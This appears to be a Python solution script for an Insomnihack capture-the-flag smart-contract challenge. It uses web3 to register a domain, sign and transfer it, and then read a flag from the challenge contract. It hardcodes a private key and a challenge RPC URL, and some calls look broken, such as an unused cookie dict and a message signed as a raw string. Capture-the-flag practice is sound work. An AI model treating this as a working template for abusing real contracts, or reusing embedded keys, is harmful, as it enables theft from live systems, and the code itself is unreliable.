import json
from web3 import Web3
from eth_account import Account
import requests
import settings

with open("contract_abi.json", "r") as abi_file:
    abi = json.load(abi_file)

rpc_url = "https://unnamed.insomnihack.ch/rpc/c06b9e2d6f5bfc8f6cea55931d4eb5d0"
private_key = "a88684ee0474394cfac4d1ef0df1c9e6f2b2643ded98bf4926557cc57f165f28"

w3 = Web3(Web3.HTTPProvider(rpc_url))

contract_address = "0x1d1f4553Bc43a1ad05c558b4d4EcDAF8163980fc"

account = Account.from_key(private_key)

w3.eth.defaultAccount = account.address
print("Address: ", account.address)

coockies = {"session": settings.SESSION}

domain_to_register = "hey.inso"
ip_to_register = "192.1.0.1"

contract = w3.eth.contract(address=contract_address, abi=abi)

# Step 1: Register a domain
transaction_hash = contract.functions.registerInsoDomain(domain_to_register, ip_to_register).transact({
    'from': account.address,
    'gas': 2000000,
    'value': w3.to_wei(1, 'ether')
})
w3.eth.waitForTransactionReceipt(transaction_hash)

# Step 2: Initiate transfer
destination_address = "0x1234567890123456789012345678901234567890"
contract.functions.initiateTransfer(f"{domain_to_register}.com.inso", destination_address).transact()

# Step 3: Sign the transfer
message_to_sign = f"{domain_to_register}.com.inso.{destination_address}"
signed_message = Account.sign_message(message_to_sign, private_key)

# Step 4: Transfer the domain
transfer_code = signed_message.signature
transaction_hash = contract.functions.transferDomain(f"{domain_to_register}.com.inso", ip_to_register, transfer_code).transact()
w3.eth.waitForTransactionReceipt(transaction_hash)

# Step 5: Retrieve the flag
flag = contract.functions.resolveIp(f"{domain_to_register}.com.inso").call()
print("Flag:", flag)
